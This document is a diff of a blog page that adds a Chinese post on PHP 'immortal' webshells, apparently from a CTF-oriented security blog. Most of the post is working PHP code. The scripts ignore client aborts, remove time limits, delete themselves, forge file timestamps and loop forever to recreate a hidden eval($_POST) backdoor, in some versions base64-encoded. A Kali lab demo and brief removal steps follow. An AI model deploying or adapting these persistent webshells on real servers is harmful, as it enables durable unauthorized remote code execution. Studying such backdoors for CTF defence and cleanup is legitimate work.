@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFer 网络安全 渗透测试">
+    <meta name="keywords" content="PHP不死马初探, CTFer 网络安全 渗透测试">
     <meta name="description" content="本科 | 软件工程 | 网络安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>孤独星球</title>
+    <title>PHP不死马初探 | 孤独星球</title>
 
     <link rel="icon" type="image/jpeg" href="https://i.loli.net/2021/11/10/guPx1Olpo6HIYai.jpg">
 
@@ -447,12 +447,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021815.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928020152.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">PHP不死马初探</h1>
                 </div>
             </div>
         </div>
@@ -571,12 +571,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                学习
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -585,28 +598,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-11-10
+                    2021-11-22
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-10
+                    2021-11-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5
+                    880
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -624,7 +637,115 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                google-site-verification: google110e5e5e14c8dcf0.html
+                <h1 id="什么是不死马"><a href="#什么是不死马" class="headerlink" title="什么是不死马"></a>什么是不死马</h1><p><strong>内存马</strong>，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。</p>
+<h4 id="流程大概为："><a href="#流程大概为：" class="headerlink" title="流程大概为："></a>流程大概为：</h4><p><code>不死马.php</code>–&gt;<code>上传到服务器</code>–&gt;<code>服务器执行</code>–&gt;<code>在服务器上循环生成</code></p>
+<p>用以上流程达到不死的效果</p>
+<h4 id="可用的php函数"><a href="#可用的php函数" class="headerlink" title="可用的php函数"></a>可用的php函数</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span><span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">&gt;</span>函数设置与客户机断开是否会终止脚本的执行。这里设置为<span class="token boolean constant">true</span>则忽略与用户的断开，即使与客户机断开脚本仍会执行。
+<span class="token number">2.</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">&gt;</span>函数设置脚本最大执行时间。这里设置为<span class="token number">0</span>，即没有时间方面的限制。
+<span class="token number">3.</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">&gt;</span>删除文件本身，以起到隐蔽自身的作用。
+<span class="token number">4.</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">&gt;</span>执行的命令用于修改文件的创建或修改时间，可以绕过“find –name <span class="token single-quoted-string string">'*.php'</span> –mmin <span class="token operator">-</span><span class="token number">10</span>”命令检测最近<span class="token number">10</span>分钟修改或新创建的<span class="token constant">PHP</span>文件，但不一定有用，可选。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="来个简单的例子"><a href="#来个简单的例子" class="headerlink" title="来个简单的例子"></a>来个简单的例子</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span>
+<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</span>
+<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//删除文件本身，以起到隐蔽自身的作用。</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'2.php'</span><span class="token punctuation">;</span> 
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?&gt;'</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将一个字符串写入文件</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'touch -m -d "2021-09-07 09:10:12" .2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> 
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>具体的思路就是，就是让客户机断开的时候，不死马也是可以运行</p>
+<p>然后不断的生成新的后门文件</p>
+<p>把自己删除，达到隐藏的目的</p>
+<p><code>.</code>为前缀的文件，还可以隐藏后门文件本身</p>
+<p>我们来试一下</p>
+<p>测试环境为 kali 虚拟机</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20210907132103742.png" alt="image-20210907132103742"></p>
+<p>在实验环境下创建马来模拟真是环境</p>
+<p>查看一下进程</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20210907132225334.png" alt="image-20210907132225334"></p>
+<p>这是实验开始前的进程</p>
+<p>然后给予<code>shell.php</code>文件的权限 然后运行一下</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20210907132313930.png" alt="image-20210907132313930"></p>
+<p>可以看到 原生成文件已经自我删除</p>
+<p>查看进程</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20210907132351627.png" alt="image-20210907132351627"></p>
+<p>已经写入到内存</p>
+<p>我们尝试删除生成的shell文件</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20210907132446906.png" alt="image-20210907132446906"></p>
+<p>会迅速再生</p>
+<p>而且打开文件会提示一直在修改</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20210907132525337.png" alt="image-20210907132525337"></p>
+<p>此时解决办法：</p>
+<p>1、查看进程然后kill掉进程最后删除木马</p>
+<p>2、重启然后删除木马</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20210907132636730.png" alt="image-20210907132636730"></p>
+<p>成功清楚木马文件</p>
+<p>当然这只是最简单的木马文件</p>
+<p>下面我们来改进一下</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'2.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?&gt;'</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'touch -m -d "2018-12-01 09:10:12" .2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> 
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果我们将</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">$code = '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token double-quoted-string string">"1a1dc91c907325c69271ddf0c944bc72"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span>';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>注释掉就可以绕过这个shell</p>
+<p>所以我们可以采用将shell<code>base64</code>加密</p>
+<p>同时进行md5校验</p>
+<p>这样更加安全</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+ <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'c.php'</span><span class="token punctuation">;</span>
+ <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+         <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">}</span>
+     <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>emmm 貌似php不死马 目前我只能写这么多了</p>
+<p>但是有个弊端</p>
+<p>被攻击者更换目录，或者把目录移走</p>
+<p>木马就会失效，所以我们可以遍历文件夹每个都写</p>
+<p>随便激活一个即可</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>	
+	<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>		
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5_file</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'{name}'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token single-quoted-string string">'912d7b3bbd5cf7405c9cc8f16156321b'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			
+		<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+			<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'{name}'</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'PD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFtoM10pKTs/Pg=='</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>			
+	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'{name}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'{name}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+	<span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
                 
             </div>
             <hr/>
@@ -650,7 +771,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://h3geeker.top/google1xxxxxxx0.html">http://h3geeker.top/google1xxxxxxx0.html</a>
+                    <a href="http://h3geeker.top/posts/a0ce185.html">http://h3geeker.top/posts/a0ce185.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -687,7 +808,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -855,18 +980,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/google1xxxxxxx0.html">
+                <a href="/posts/d1a4aa03.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021815.jpg" class="responsive-img" alt="">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928013346.png" class="responsive-img" alt="Thinkphp &lt; 6.0.2 session id未作过滤导致getshell">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">Thinkphp &lt; 6.0.2 session id未作过滤导致getshell</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -876,18 +1000,29 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-10
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-22
+                        </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            H3h3QAQ
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CVE%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    CVE复现
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">CVE漏洞复现</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -895,37 +1030,52 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/google1xxxxxxx0.html">
+                <a href="/posts/598866b.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021815.jpg" class="responsive-img" alt="">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021440.jpg" class="responsive-img" alt="CVE-2019-9081 Laravel5.7 反序列化 RCE">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">CVE-2019-9081 Laravel5.7 反序列化 RCE</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            CVE-2019-9081 Laravel5.7 反序列化 RCE漏洞的复现
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-16
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            H3h3QAQ
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CVE%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    CVE复现
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">CVE漏洞复现</span>
+                    </a>
+                    
+                    <a href="/tags/CVE-2019-9081/">
+                        <span class="chip bg-color">CVE-2019-9081</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
